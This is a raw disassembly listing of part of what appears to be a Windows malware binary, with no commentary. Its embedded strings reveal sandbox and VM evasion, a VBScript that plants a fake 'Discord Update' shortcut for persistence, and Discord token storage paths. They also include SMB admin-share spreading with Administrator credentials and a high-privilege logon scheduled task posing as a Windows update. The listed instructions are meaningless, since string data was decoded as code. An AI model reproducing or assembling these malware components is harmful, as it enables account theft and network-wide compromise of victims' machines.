  40a173:	70 00                	jo     0x40a175
  40a175:	6f                   	outsl  %ds:(%esi),(%dx)
  40a176:	00 72 00             	add    %dh,0x0(%edx)
  40a179:	61                   	popa
  40a17a:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40a17e:	00 6f 00             	add    %ch,0x0(%edi)
  40a181:	6e                   	outsb  %ds:(%esi),(%dx)
  40a182:	00 00                	add    %al,(%eax)
  40a184:	15 76 00 69 00       	adc    $0x690076,%eax
  40a189:	72 00                	jb     0x40a18b
  40a18b:	74 00                	je     0x40a18d
  40a18d:	75 00                	jne    0x40a18f
  40a18f:	61                   	popa
  40a190:	00 6c 00 62          	add    %ch,0x62(%eax,%eax,1)
  40a194:	00 6f 00             	add    %ch,0x0(%edi)
  40a197:	78 00                	js     0x40a199
  40a199:	00 07                	add    %al,(%edi)
  40a19b:	78 00                	js     0x40a19d
  40a19d:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40a1a1:	00 13                	add    %dl,(%ebx)
  40a1a3:	70 00                	jo     0x40a1a5
  40a1a5:	61                   	popa
  40a1a6:	00 72 00             	add    %dh,0x0(%edx)
  40a1a9:	61                   	popa
  40a1aa:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40a1ae:	00 65 00             	add    %ah,0x0(%ebp)
  40a1b1:	6c                   	insb   (%dx),%es:(%edi)
  40a1b2:	00 73 00             	add    %dh,0x0(%ebx)
  40a1b5:	00 0b                	add    %cl,(%ebx)
  40a1b7:	62 00                	bound  %eax,(%eax)
  40a1b9:	68 00 79 00 76       	push   $0x76007900
  40a1be:	00 65 00             	add    %ah,0x0(%ebp)
  40a1c1:	00 07                	add    %al,(%edi)
  40a1c3:	6b 00 76             	imul   $0x76,(%eax),%eax
  40a1c6:	00 6d 00             	add    %ch,0x0(%ebp)
  40a1c9:	00 0b                	add    %cl,(%ebx)
  40a1cb:	62 00                	bound  %eax,(%eax)
  40a1cd:	6f                   	outsl  %ds:(%esi),(%dx)
  40a1ce:	00 63 00             	add    %ah,0x0(%ebx)
  40a1d1:	68 00 73 00 00       	push   $0x7300
  40a1d6:	11 30                	adc    %esi,(%eax)
  40a1d8:	00 30                	add    %dh,(%eax)
  40a1da:	00 3a                	add    %bh,(%edx)
  40a1dc:	00 30                	add    %dh,(%eax)
  40a1de:	00 35 00 3a 00 36    	add    %dh,0x36003a00
  40a1e4:	00 39                	add    %bh,(%ecx)
  40a1e6:	00 00                	add    %al,(%eax)
  40a1e8:	11 30                	adc    %esi,(%eax)
  40a1ea:	00 30                	add    %dh,(%eax)
  40a1ec:	00 3a                	add    %bh,(%edx)
  40a1ee:	00 30                	add    %dh,(%eax)
  40a1f0:	00 43 00             	add    %al,0x0(%ebx)
  40a1f3:	3a 00                	cmp    (%eax),%al
  40a1f5:	32 00                	xor    (%eax),%al
  40a1f7:	39 00                	cmp    %eax,(%eax)
  40a1f9:	00 11                	add    %dl,(%ecx)
  40a1fb:	30 00                	xor    %al,(%eax)
  40a1fd:	30 00                	xor    %al,(%eax)
  40a1ff:	3a 00                	cmp    (%eax),%al
  40a201:	31 00                	xor    %eax,(%eax)
  40a203:	43                   	inc    %ebx
  40a204:	00 3a                	add    %bh,(%edx)
  40a206:	00 31                	add    %dh,(%ecx)
  40a208:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a20b:	00 11                	add    %dl,(%ecx)
  40a20d:	30 00                	xor    %al,(%eax)
  40a20f:	30 00                	xor    %al,(%eax)
  40a211:	3a 00                	cmp    (%eax),%al
  40a213:	35 00 30 00 3a       	xor    $0x3a003000,%eax
  40a218:	00 35 00 36 00 00    	add    %dh,0x3600
  40a21e:	11 30                	adc    %esi,(%eax)
  40a220:	00 38                	add    %bh,(%eax)
  40a222:	00 3a                	add    %bh,(%edx)
  40a224:	00 30                	add    %dh,(%eax)
  40a226:	00 30                	add    %dh,(%eax)
  40a228:	00 3a                	add    %bh,(%edx)
  40a22a:	00 32                	add    %dh,(%edx)
  40a22c:	00 37                	add    %dh,(%edi)
  40a22e:	00 00                	add    %al,(%eax)
  40a230:	11 30                	adc    %esi,(%eax)
  40a232:	00 41 00             	add    %al,0x0(%ecx)
  40a235:	3a 00                	cmp    (%eax),%al
  40a237:	30 00                	xor    %al,(%eax)
  40a239:	30 00                	xor    %al,(%eax)
  40a23b:	3a 00                	cmp    (%eax),%al
  40a23d:	32 00                	xor    (%eax),%al
  40a23f:	37                   	aaa
  40a240:	00 00                	add    %al,(%eax)
  40a242:	11 30                	adc    %esi,(%eax)
  40a244:	00 30                	add    %dh,(%eax)
  40a246:	00 3a                	add    %bh,(%edx)
  40a248:	00 30                	add    %dh,(%eax)
  40a24a:	00 33                	add    %dh,(%ebx)
  40a24c:	00 3a                	add    %bh,(%edx)
  40a24e:	00 46 00             	add    %al,0x0(%esi)
  40a251:	46                   	inc    %esi
  40a252:	00 00                	add    %al,(%eax)
  40a254:	11 30                	adc    %esi,(%eax)
  40a256:	00 30                	add    %dh,(%eax)
  40a258:	00 3a                	add    %bh,(%edx)
  40a25a:	00 31                	add    %dh,(%ecx)
  40a25c:	00 35 00 3a 00 35    	add    %dh,0x35003a00
  40a262:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40a266:	0f 44 00             	cmove  (%eax),%eax
  40a269:	69 00 73 00 63 00    	imul   $0x630073,(%eax),%eax
  40a26f:	6f                   	outsl  %ds:(%esi),(%dx)
  40a270:	00 72 00             	add    %dh,0x0(%edx)
  40a273:	64 00 00             	add    %al,%fs:(%eax)
  40a276:	25 64 00 69 00       	and    $0x690064,%eax
  40a27b:	73 00                	jae    0x40a27d
  40a27d:	63 00                	arpl   %eax,(%eax)
  40a27f:	6f                   	outsl  %ds:(%esi),(%dx)
  40a280:	00 72 00             	add    %dh,0x0(%edx)
  40a283:	64 00 5f 00          	add    %bl,%fs:0x0(%edi)
  40a287:	75 00                	jne    0x40a289
  40a289:	70 00                	jo     0x40a28b
  40a28b:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40a28f:	74 00                	je     0x40a291
  40a291:	65 00 2e             	add    %ch,%gs:(%esi)
  40a294:	00 6c 00 6e          	add    %ch,0x6e(%eax,%eax,1)
  40a298:	00 6b 00             	add    %ch,0x0(%ebx)
  40a29b:	00 80 a7 0d 00 0a    	add    %al,0xa000da7(%eax)
  40a2a1:	00 53 00             	add    %dl,0x0(%ebx)
  40a2a4:	65 00 74 00 20       	add    %dh,%gs:0x20(%eax,%eax,1)
  40a2a9:	00 6f 00             	add    %ch,0x0(%edi)
  40a2ac:	57                   	push   %edi
  40a2ad:	00 53 00             	add    %dl,0x0(%ebx)
  40a2b0:	20 00                	and    %al,(%eax)
  40a2b2:	3d 00 20 00 57       	cmp    $0x57002000,%eax
  40a2b7:	00 53 00             	add    %dl,0x0(%ebx)
  40a2ba:	63 00                	arpl   %eax,(%eax)
  40a2bc:	72 00                	jb     0x40a2be
  40a2be:	69 00 70 00 74 00    	imul   $0x740070,(%eax),%eax
  40a2c4:	2e 00 43 00          	add    %al,%cs:0x0(%ebx)
  40a2c8:	72 00                	jb     0x40a2ca
  40a2ca:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40a2ce:	74 00                	je     0x40a2d0
  40a2d0:	65 00 4f 00          	add    %cl,%gs:0x0(%edi)
  40a2d4:	62 00                	bound  %eax,(%eax)
  40a2d6:	6a 00                	push   $0x0
  40a2d8:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40a2dc:	74 00                	je     0x40a2de
  40a2de:	28 00                	sub    %al,(%eax)
  40a2e0:	22 00                	and    (%eax),%al
  40a2e2:	57                   	push   %edi
  40a2e3:	00 53 00             	add    %dl,0x0(%ebx)
  40a2e6:	63 00                	arpl   %eax,(%eax)
  40a2e8:	72 00                	jb     0x40a2ea
  40a2ea:	69 00 70 00 74 00    	imul   $0x740070,(%eax),%eax
  40a2f0:	2e 00 53 00          	add    %dl,%cs:0x0(%ebx)
  40a2f4:	68 00 65 00 6c       	push   $0x6c006500
  40a2f9:	00 6c 00 22          	add    %ch,0x22(%eax,%eax,1)
  40a2fd:	00 29                	add    %ch,(%ecx)
  40a2ff:	00 0d 00 0a 00 53    	add    %cl,0x53000a00
  40a305:	00 65 00             	add    %ah,0x0(%ebp)
  40a308:	74 00                	je     0x40a30a
  40a30a:	20 00                	and    %al,(%eax)
  40a30c:	6f                   	outsl  %ds:(%esi),(%dx)
  40a30d:	00 4c 00 69          	add    %cl,0x69(%eax,%eax,1)
  40a311:	00 6e 00             	add    %ch,0x0(%esi)
  40a314:	6b 00 20             	imul   $0x20,(%eax),%eax
  40a317:	00 3d 00 20 00 6f    	add    %bh,0x6f002000
  40a31d:	00 57 00             	add    %dl,0x0(%edi)
  40a320:	53                   	push   %ebx
  40a321:	00 2e                	add    %ch,(%esi)
  40a323:	00 43 00             	add    %al,0x0(%ebx)
  40a326:	72 00                	jb     0x40a328
  40a328:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40a32c:	74 00                	je     0x40a32e
  40a32e:	65 00 53 00          	add    %dl,%gs:0x0(%ebx)
  40a332:	68 00 6f 00 72       	push   $0x72006f00
  40a337:	00 74 00 63          	add    %dh,0x63(%eax,%eax,1)
  40a33b:	00 75 00             	add    %dh,0x0(%ebp)
  40a33e:	74 00                	je     0x40a340
  40a340:	28 00                	sub    %al,(%eax)
  40a342:	22 00                	and    (%eax),%al
  40a344:	00 31                	add    %dh,(%ecx)
  40a346:	22 00                	and    (%eax),%al
  40a348:	29 00                	sub    %eax,(%eax)
  40a34a:	0d 00 0a 00 6f       	or     $0x6f000a00,%eax
  40a34f:	00 4c 00 69          	add    %cl,0x69(%eax,%eax,1)
  40a353:	00 6e 00             	add    %ch,0x0(%esi)
  40a356:	6b 00 2e             	imul   $0x2e,(%eax),%eax
  40a359:	00 54 00 61          	add    %dl,0x61(%eax,%eax,1)
  40a35d:	00 72 00             	add    %dh,0x0(%edx)
  40a360:	67 00 65 00          	add    %ah,0x0(%di)
  40a364:	74 00                	je     0x40a366
  40a366:	50                   	push   %eax
  40a367:	00 61 00             	add    %ah,0x0(%ecx)
  40a36a:	74 00                	je     0x40a36c
  40a36c:	68 00 20 00 3d       	push   $0x3d002000
  40a371:	00 20                	add    %ah,(%eax)
  40a373:	00 22                	add    %ah,(%edx)
  40a375:	00 00                	add    %al,(%eax)
  40a377:	3b 22                	cmp    (%edx),%esp
  40a379:	00 0d 00 0a 00 6f    	add    %cl,0x6f000a00
  40a37f:	00 4c 00 69          	add    %cl,0x69(%eax,%eax,1)
  40a383:	00 6e 00             	add    %ch,0x0(%esi)
  40a386:	6b 00 2e             	imul   $0x2e,(%eax),%eax
  40a389:	00 57 00             	add    %dl,0x0(%edi)
  40a38c:	6f                   	outsl  %ds:(%esi),(%dx)
  40a38d:	00 72 00             	add    %dh,0x0(%edx)
  40a390:	6b 00 69             	imul   $0x69,(%eax),%eax
  40a393:	00 6e 00             	add    %ch,0x0(%esi)
  40a396:	67 00 44 00          	add    %al,0x0(%si)
  40a39a:	69 00 72 00 65 00    	imul   $0x650072,(%eax),%eax
  40a3a0:	63 00                	arpl   %eax,(%eax)
  40a3a2:	74 00                	je     0x40a3a4
  40a3a4:	6f                   	outsl  %ds:(%esi),(%dx)
  40a3a5:	00 72 00             	add    %dh,0x0(%edx)
  40a3a8:	79 00                	jns    0x40a3aa
  40a3aa:	20 00                	and    %al,(%eax)
  40a3ac:	3d 00 20 00 22       	cmp    $0x22002000,%eax
  40a3b1:	00 00                	add    %al,(%eax)
  40a3b3:	80 99 22 00 0d 00 0a 	sbbb   $0xa,0xd0022(%ecx)
  40a3ba:	00 6f 00             	add    %ch,0x0(%edi)
  40a3bd:	4c                   	dec    %esp
  40a3be:	00 69 00             	add    %ch,0x0(%ecx)
  40a3c1:	6e                   	outsb  %ds:(%esi),(%dx)
  40a3c2:	00 6b 00             	add    %ch,0x0(%ebx)
  40a3c5:	2e 00 57 00          	add    %dl,%cs:0x0(%edi)
  40a3c9:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  40a3cf:	6f                   	outsl  %ds:(%esi),(%dx)
  40a3d0:	00 77 00             	add    %dh,0x0(%edi)
  40a3d3:	53                   	push   %ebx
  40a3d4:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  40a3d8:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  40a3dc:	00 20                	add    %ah,(%eax)
  40a3de:	00 3d 00 20 00 31    	add    %bh,0x31002000
  40a3e4:	00 0d 00 0a 00 6f    	add    %cl,0x6f000a00
  40a3ea:	00 4c 00 69          	add    %cl,0x69(%eax,%eax,1)
  40a3ee:	00 6e 00             	add    %ch,0x0(%esi)
  40a3f1:	6b 00 2e             	imul   $0x2e,(%eax),%eax
  40a3f4:	00 44 00 65          	add    %al,0x65(%eax,%eax,1)
  40a3f8:	00 73 00             	add    %dh,0x0(%ebx)
  40a3fb:	63 00                	arpl   %eax,(%eax)
  40a3fd:	72 00                	jb     0x40a3ff
  40a3ff:	69 00 70 00 74 00    	imul   $0x740070,(%eax),%eax
  40a405:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40a40b:	20 00                	and    %al,(%eax)
  40a40d:	3d 00 20 00 22       	cmp    $0x22002000,%eax
  40a412:	00 44 00 69          	add    %al,0x69(%eax,%eax,1)
  40a416:	00 73 00             	add    %dh,0x0(%ebx)
  40a419:	63 00                	arpl   %eax,(%eax)
  40a41b:	6f                   	outsl  %ds:(%esi),(%dx)
  40a41c:	00 72 00             	add    %dh,0x0(%edx)
  40a41f:	64 00 20             	add    %ah,%fs:(%eax)
  40a422:	00 55 00             	add    %dl,0x0(%ebp)
  40a425:	70 00                	jo     0x40a427
  40a427:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40a42b:	74 00                	je     0x40a42d
  40a42d:	65 00 22             	add    %ah,%gs:(%edx)
  40a430:	00 0d 00 0a 00 6f    	add    %cl,0x6f000a00
  40a436:	00 4c 00 69          	add    %cl,0x69(%eax,%eax,1)
  40a43a:	00 6e 00             	add    %ch,0x0(%esi)
  40a43d:	6b 00 2e             	imul   $0x2e,(%eax),%eax
  40a440:	00 53 00             	add    %dl,0x0(%ebx)
  40a443:	61                   	popa
  40a444:	00 76 00             	add    %dh,0x0(%esi)
  40a447:	65 00 0d 00 0a 00 00 	add    %cl,%gs:0xa00
  40a44e:	0b 74 00 65          	or     0x65(%eax,%eax,1),%esi
  40a452:	00 6d 00             	add    %ch,0x0(%ebp)
  40a455:	70 00                	jo     0x40a457
  40a457:	5f                   	pop    %edi
  40a458:	00 00                	add    %al,(%eax)
  40a45a:	03 4e 00             	add    0x0(%esi),%ecx
  40a45d:	00 09                	add    %cl,(%ecx)
  40a45f:	2e 00 76 00          	add    %dh,%cs:0x0(%esi)
  40a463:	62 00                	bound  %eax,(%eax)
  40a465:	73 00                	jae    0x40a467
  40a467:	00 0f                	add    %cl,(%edi)
  40a469:	77 00                	ja     0x40a46b
  40a46b:	73 00                	jae    0x40a46d
  40a46d:	63 00                	arpl   %eax,(%eax)
  40a46f:	72 00                	jb     0x40a471
  40a471:	69 00 70 00 74 00    	imul   $0x740070,(%eax),%eax
  40a477:	00 0b                	add    %cl,(%ebx)
  40a479:	43                   	inc    %ebx
  40a47a:	00 61 00             	add    %ah,0x0(%ecx)
  40a47d:	63 00                	arpl   %eax,(%eax)
  40a47f:	68 00 65 00 00       	push   $0x6500
  40a484:	1b 43 00             	sbb    0x0(%ebx),%eax
  40a487:	6f                   	outsl  %ds:(%esi),(%dx)
  40a488:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40a48c:	00 20                	add    %ah,(%eax)
  40a48e:	00 43 00             	add    %al,0x0(%ebx)
  40a491:	61                   	popa
  40a492:	00 63 00             	add    %ah,0x0(%ebx)
  40a495:	68 00 65 00 5c       	push   $0x5c006500
  40a49a:	00 6a 00             	add    %ch,0x0(%edx)
  40a49d:	73 00                	jae    0x40a49f
  40a49f:	00 13                	add    %dl,(%ebx)
  40a4a1:	49                   	dec    %ecx
  40a4a2:	00 6e 00             	add    %ch,0x0(%esi)
  40a4a5:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  40a4a9:	78 00                	js     0x40a4ab
  40a4ab:	65 00 64 00 44       	add    %ah,%gs:0x44(%eax,%eax,1)
  40a4b0:	00 42 00             	add    %al,0x0(%edx)
  40a4b3:	00 1b                	add    %bl,(%ebx)
  40a4b5:	4c                   	dec    %esp
  40a4b6:	00 6f 00             	add    %ch,0x0(%edi)
  40a4b9:	63 00                	arpl   %eax,(%eax)
  40a4bb:	61                   	popa
  40a4bc:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  40a4c0:	00 53 00             	add    %dl,0x0(%ebx)
  40a4c3:	74 00                	je     0x40a4c5
  40a4c5:	6f                   	outsl  %ds:(%esi),(%dx)
  40a4c6:	00 72 00             	add    %dh,0x0(%edx)
  40a4c9:	61                   	popa
  40a4ca:	00 67 00             	add    %ah,0x0(%edi)
  40a4cd:	65 00 00             	add    %al,%gs:(%eax)
  40a4d0:	03 2e                	add    (%esi),%ebp
  40a4d2:	00 00                	add    %al,(%eax)
  40a4d4:	05 43 00 24 00       	add    $0x240043,%eax
  40a4d9:	00 0d 41 00 44 00    	add    %cl,0x440041
  40a4df:	4d                   	dec    %ebp
  40a4e0:	00 49 00             	add    %cl,0x0(%ecx)
  40a4e3:	4e                   	dec    %esi
  40a4e4:	00 24 00             	add    %ah,(%eax,%eax,1)
  40a4e7:	00 0b                	add    %cl,(%ebx)
  40a4e9:	55                   	push   %ebp
  40a4ea:	00 73 00             	add    %dh,0x0(%ebx)
  40a4ed:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a4f1:	73 00                	jae    0x40a4f3
  40a4f3:	00 0d 50 00 75 00    	add    %cl,0x750050
  40a4f9:	62 00                	bound  %eax,(%eax)
  40a4fb:	6c                   	insb   (%dx),%es:(%edi)
  40a4fc:	00 69 00             	add    %ch,0x0(%ecx)
  40a4ff:	63 00                	arpl   %eax,(%eax)
  40a501:	00 13                	add    %dl,(%ebx)
  40a503:	44                   	inc    %esp
  40a504:	00 6f 00             	add    %ch,0x0(%edi)
  40a507:	63 00                	arpl   %eax,(%eax)
  40a509:	75 00                	jne    0x40a50b
  40a50b:	6d                   	insl   (%dx),%es:(%edi)
  40a50c:	00 65 00             	add    %ah,0x0(%ebp)
  40a50f:	6e                   	outsb  %ds:(%esi),(%dx)
  40a510:	00 74 00 73          	add    %dh,0x73(%eax,%eax,1)
  40a514:	00 00                	add    %al,(%eax)
  40a516:	13 44 00 6f          	adc    0x6f(%eax,%eax,1),%eax
  40a51a:	00 77 00             	add    %dh,0x0(%edi)
  40a51d:	6e                   	outsb  %ds:(%esi),(%dx)
  40a51e:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  40a522:	00 61 00             	add    %ah,0x0(%ecx)
  40a525:	64 00 73 00          	add    %dh,%fs:0x0(%ebx)
  40a529:	00 0d 53 00 68 00    	add    %cl,0x680053
  40a52f:	61                   	popa
  40a530:	00 72 00             	add    %dh,0x0(%edx)
  40a533:	65 00 64 00 00       	add    %ah,%gs:0x0(%eax,%eax,1)
  40a538:	09 54 00 65          	or     %edx,0x65(%eax,%eax,1)
  40a53c:	00 6d 00             	add    %ch,0x0(%ebp)
  40a53f:	70 00                	jo     0x40a541
  40a541:	00 09                	add    %cl,(%ecx)
  40a543:	49                   	dec    %ecx
  40a544:	00 50 00             	add    %dl,0x0(%eax)
  40a547:	43                   	inc    %ebx
  40a548:	00 24 00             	add    %ah,(%eax,%eax,1)
  40a54b:	00 43 54             	add    %al,0x54(%ebx)
  40a54e:	00 41 00             	add    %al,0x0(%ecx)
  40a551:	52                   	push   %edx
  40a552:	00 47 00             	add    %al,0x0(%edi)
  40a555:	45                   	inc    %ebp
  40a556:	00 54 00 5f          	add    %dl,0x5f(%eax,%eax,1)
  40a55a:	00 4d 00             	add    %cl,0x0(%ebp)
  40a55d:	41                   	inc    %ecx
  40a55e:	00 43 00             	add    %al,0x0(%ebx)
  40a561:	48                   	dec    %eax
  40a562:	00 49 00             	add    %cl,0x0(%ecx)
  40a565:	4e                   	dec    %esi
  40a566:	00 45 00             	add    %al,0x0(%ebp)
  40a569:	5f                   	pop    %edi
  40a56a:	00 4e 00             	add    %cl,0x0(%esi)
  40a56d:	41                   	inc    %ecx
  40a56e:	00 4d 00             	add    %cl,0x0(%ebp)
  40a571:	45                   	inc    %ebp
  40a572:	00 5c 00 41          	add    %bl,0x41(%eax,%eax,1)
  40a576:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  40a57a:	00 69 00             	add    %ch,0x0(%ecx)
  40a57d:	6e                   	outsb  %ds:(%esi),(%dx)
  40a57e:	00 69 00             	add    %ch,0x0(%ecx)
  40a581:	73 00                	jae    0x40a583
  40a583:	74 00                	je     0x40a585
  40a585:	72 00                	jb     0x40a587
  40a587:	61                   	popa
  40a588:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  40a58c:	00 72 00             	add    %dh,0x0(%edx)
  40a58f:	00 19                	add    %bl,(%ecx)
  40a591:	79 00                	jns    0x40a593
  40a593:	6f                   	outsl  %ds:(%esi),(%dx)
  40a594:	00 75 00             	add    %dh,0x0(%ebp)
  40a597:	72 00                	jb     0x40a599
  40a599:	70 00                	jo     0x40a59b
  40a59b:	61                   	popa
  40a59c:	00 73 00             	add    %dh,0x0(%ebx)
  40a59f:	73 00                	jae    0x40a5a1
  40a5a1:	77 00                	ja     0x40a5a3
  40a5a3:	6f                   	outsl  %ds:(%esi),(%dx)
  40a5a4:	00 72 00             	add    %dh,0x0(%edx)
  40a5a7:	64 00 00             	add    %al,%fs:(%eax)
  40a5aa:	49                   	dec    %ecx
  40a5ab:	61                   	popa
  40a5ac:	00 62 00             	add    %ah,0x0(%edx)
  40a5af:	63 00                	arpl   %eax,(%eax)
  40a5b1:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  40a5b5:	66 00 67 00          	data16 add %ah,0x0(%edi)
  40a5b9:	68 00 69 00 6a       	push   $0x6a006900
  40a5be:	00 6b 00             	add    %ch,0x0(%ebx)
  40a5c1:	6c                   	insb   (%dx),%es:(%edi)
  40a5c2:	00 6d 00             	add    %ch,0x0(%ebp)
  40a5c5:	6e                   	outsb  %ds:(%esi),(%dx)
  40a5c6:	00 6f 00             	add    %ch,0x0(%edi)
  40a5c9:	70 00                	jo     0x40a5cb
  40a5cb:	71 00                	jno    0x40a5cd
  40a5cd:	72 00                	jb     0x40a5cf
  40a5cf:	73 00                	jae    0x40a5d1
  40a5d1:	74 00                	je     0x40a5d3
  40a5d3:	75 00                	jne    0x40a5d5
  40a5d5:	76 00                	jbe    0x40a5d7
  40a5d7:	77 00                	ja     0x40a5d9
  40a5d9:	78 00                	js     0x40a5db
  40a5db:	79 00                	jns    0x40a5dd
  40a5dd:	7a 00                	jp     0x40a5df
  40a5df:	30 00                	xor    %al,(%eax)
  40a5e1:	31 00                	xor    %eax,(%eax)
  40a5e3:	32 00                	xor    (%eax),%al
  40a5e5:	33 00                	xor    (%eax),%eax
  40a5e7:	34 00                	xor    $0x0,%al
  40a5e9:	35 00 36 00 37       	xor    $0x37003600,%eax
  40a5ee:	00 38                	add    %bh,(%eax)
  40a5f0:	00 39                	add    %bh,(%ecx)
  40a5f2:	00 00                	add    %al,(%eax)
  40a5f4:	09 2e                	or     %ebp,(%esi)
  40a5f6:	00 65 00             	add    %ah,0x0(%ebp)
  40a5f9:	78 00                	js     0x40a5fb
  40a5fb:	65 00 00             	add    %al,%gs:(%eax)
  40a5fe:	29 57 00             	sub    %edx,0x0(%edi)
  40a601:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  40a607:	6f                   	outsl  %ds:(%esi),(%dx)
  40a608:	00 77 00             	add    %dh,0x0(%edi)
  40a60b:	73 00                	jae    0x40a60d
  40a60d:	55                   	push   %ebp
  40a60e:	00 70 00             	add    %dh,0x0(%eax)
  40a611:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40a615:	74 00                	je     0x40a617
  40a617:	65 00 53 00          	add    %dl,%gs:0x0(%ebx)
  40a61b:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a61f:	76 00                	jbe    0x40a621
  40a621:	69 00 63 00 65 00    	imul   $0x650063,(%eax),%eax
  40a627:	00 4b 2f             	add    %cl,0x2f(%ebx)
  40a62a:	00 43 00             	add    %al,0x0(%ebx)
  40a62d:	72 00                	jb     0x40a62f
  40a62f:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40a633:	74 00                	je     0x40a635
  40a635:	65 00 20             	add    %ah,%gs:(%eax)
  40a638:	00 2f                	add    %ch,(%edi)
  40a63a:	00 53 00             	add    %dl,0x0(%ebx)
  40a63d:	43                   	inc    %ebx
  40a63e:	00 20                	add    %ah,(%eax)
  40a640:	00 4f 00             	add    %cl,0x0(%edi)
  40a643:	4e                   	dec    %esi
  40a644:	00 4c 00 4f          	add    %cl,0x4f(%eax,%eax,1)
  40a648:	00 47 00             	add    %al,0x0(%edi)
  40a64b:	4f                   	dec    %edi
  40a64c:	00 4e 00             	add    %cl,0x0(%esi)
  40a64f:	20 00                	and    %al,(%eax)
  40a651:	2f                   	das
  40a652:	00 52 00             	add    %dl,0x0(%edx)
  40a655:	4c                   	dec    %esp
  40a656:	00 20                	add    %ah,(%eax)
  40a658:	00 48 00             	add    %cl,0x0(%eax)
  40a65b:	49                   	dec    %ecx
  40a65c:	00 47 00             	add    %al,0x0(%edi)
  40a65f:	48                   	dec    %eax
  40a660:	00 45 00             	add    %al,0x0(%ebp)
  40a663:	53                   	push   %ebx
  40a664:	00 54 00 20          	add    %dl,0x20(%eax,%eax,1)
  40a668:	00 2f                	add    %ch,(%edi)
  40a66a:	00 54 00 4e          	add    %dl,0x4e(%eax,%eax,1)
  40a66e:	00 20                	add    %ah,(%eax)
  40a670:	00 22                	add    %ah,(%edx)
  40a672:	00 00                	add    %al,(%eax)
  40a674:	0f 22 00             	mov    %eax,%cr0
  40a677:	20 00                	and    %al,(%eax)
  40a679:	2f                   	das
  40a67a:	00 54 00 52          	add    %dl,0x52(%eax,%eax,1)
  40a67e:	00 20                	add    %ah,(%eax)
  40a680:	00 22                	add    %ah,(%edx)
  40a682:	00 00                	add    %al,(%eax)
  40a684:	09 22                	or     %esp,(%edx)
  40a686:	00 20                	add    %ah,(%eax)
  40a688:	00 2f                	add    %ch,(%edi)
  40a68a:	00 46 00             	add    %al,0x0(%esi)
  40a68d:	00 19                	add    %bl,(%ecx)
  40a68f:	73 00                	jae    0x40a691
  40a691:	63 00                	arpl   %eax,(%eax)
  40a693:	68 00 74 00 61       	push   $0x61007400
  40a698:	00 73 00             	add    %dh,0x0(%ebx)
  40a69b:	6b 00 73             	imul   $0x73,(%eax),%eax
  40a69e:	00 2e                	add    %ch,(%esi)
  40a6a0:	00 65 00             	add    %ah,0x0(%ebp)
  40a6a3:	78 00                	js     0x40a6a5
  40a6a5:	65 00 00             	add    %al,%gs:(%eax)
  40a6a8:	0b 2a                	or     (%edx),%ebp
  40a6aa:	00 2e                	add    %ch,(%esi)
  40a6ac:	00 65 00             	add    %ah,0x0(%ebp)
  40a6af:	78 00                	js     0x40a6b1
  40a6b1:	65 00 00             	add    %al,%gs:(%eax)
  40a6b4:	19 53 00             	sbb    %edx,0x0(%ebx)
  40a6b7:	79 00                	jns    0x40a6b9
  40a6b9:	73 00                	jae    0x40a6bb
  40a6bb:	74 00                	je     0x40a6bd
  40a6bd:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40a6c1:	55                   	push   %ebp
  40a6c2:	00 70 00             	add    %dh,0x0(%eax)
  40a6c5:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40a6c9:	74 00                	je     0x40a6cb
  40a6cb:	65 00 00             	add    %al,%gs:(%eax)
  40a6ce:	15 6e 00 65 00       	adc    $0x65006e,%eax
  40a6d3:	62 00                	bound  %eax,(%eax)
  40a6d5:	75 00                	jne    0x40a6d7
  40a6d7:	6c                   	insb   (%dx),%es:(%edi)
  40a6d8:	00 61 00             	add    %ah,0x0(%ecx)
  40a6db:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  40a6df:	78 00                	js     0x40a6e1
  40a6e1:	65 00 00             	add    %al,%gs:(%eax)
  40a6e4:	7d 61                	jge    0x40a747
  40a6e6:	00 62 00             	add    %ah,0x0(%edx)
  40a6e9:	63 00                	arpl   %eax,(%eax)
  40a6eb:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  40a6ef:	66 00 67 00          	data16 add %ah,0x0(%edi)
  40a6f3:	68 00 69 00 6a       	push   $0x6a006900
  40a6f8:	00 6b 00             	add    %ch,0x0(%ebx)
  40a6fb:	6c                   	insb   (%dx),%es:(%edi)
  40a6fc:	00 6d 00             	add    %ch,0x0(%ebp)
  40a6ff:	6e                   	outsb  %ds:(%esi),(%dx)
  40a700:	00 6f 00             	add    %ch,0x0(%edi)
  40a703:	70 00                	jo     0x40a705
  40a705:	71 00                	jno    0x40a707
  40a707:	72 00                	jb     0x40a709
  40a709:	73 00                	jae    0x40a70b
  40a70b:	74 00                	je     0x40a70d
  40a70d:	75 00                	jne    0x40a70f
  40a70f:	76 00                	jbe    0x40a711
  40a711:	77 00                	ja     0x40a713
  40a713:	78 00                	js     0x40a715
  40a715:	79 00                	jns    0x40a717
  40a717:	7a 00                	jp     0x40a719
  40a719:	41                   	inc    %ecx
  40a71a:	00 42 00             	add    %al,0x0(%edx)
  40a71d:	43                   	inc    %ebx
